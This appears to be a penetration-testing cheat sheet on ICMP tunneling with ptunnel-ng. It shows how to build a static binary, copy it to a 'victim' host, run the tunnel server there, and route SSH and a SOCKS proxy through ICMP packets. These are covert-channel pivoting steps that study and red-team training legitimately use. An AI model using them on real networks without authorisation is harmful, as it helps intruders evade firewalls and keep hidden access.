ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses

We will use ptunnel-ng

Usage
```bash
# setup
sudo apt-get install openssl
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh 
# ALTERNATIVE -- static binary -- IMPORTANT if box is missing updates
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# transfer to victim
scp -r ptunnel-ng <user>@<ip>:~/

# Start server on target
cd /ptunnel-ng/src
sudo ./ptunnel-ng -r<pivot_box_external_ip> -R22

# connect to victim from attack host w local port 2222 (enables ICMP tunnel)
sudo ./ptunnel-ng -p<pivot_box_external_ip> -l2222 -r<pivot_box_external_ip> -R22

# Tunnel SSH connection through ICMP tunnel
ssh -p2222 -l<user> 127.0.0.1

# Tunnel SSH connection through ICMP tunnel w/ Dynamic port forwarding
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains <command>...
```